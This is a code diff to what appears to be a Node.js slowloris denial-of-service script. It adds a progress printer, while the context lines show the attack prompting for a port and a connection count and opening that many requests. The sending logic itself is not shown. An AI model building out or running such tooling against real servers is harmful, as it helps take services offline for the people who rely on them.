@@ -16,6 +16,15 @@ const rlp = readline.createInterface({
 
 slowlorisAttack()
 
+function printWhileSending() {
+  setTimeout(() => {
+    process.stdout.write('Sending headers')
+    setInterval(() => {
+      process.stdout.write('.');
+    }, 250)
+  }, 1000)
+}
+
 function slowlorisAttack() {
   rlp.questionAsync('Which port? ').then(p => {
     rlp.questionAsync('How many connections? ').then(c => {
@@ -26,6 +35,8 @@ function slowlorisAttack() {
       for(let i = 0; i < connections; i++) {
         sendRequest(req, port)
       }
+
+      printWhileSending()
     })
   })
 }
